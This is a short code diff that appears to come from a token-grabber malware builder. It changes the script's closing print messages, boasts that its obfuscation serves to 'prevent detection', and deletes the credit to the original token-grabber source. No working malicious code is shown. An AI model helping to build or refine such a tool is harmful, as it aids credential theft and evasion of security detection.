@@ -85,8 +85,7 @@ def main():
             print(f"{file} not found while checking outputs, ts aint good")
 
     print(f"done, check {dest}")
-    print(f"P.S: the 'obfuscation' in question is pretty shitty at obfuscation, it is mostly to prevent detection")
-    print(f"src credits to https://github.com/AstraaDev/tokengrabber, basically all his code")
+    print(f"P.S: the 'obfuscation' in question is actually pretty shitty at obfuscation, it is mostly to prevent detection - which is does well")
 
 
 if __name__ == "__main__":
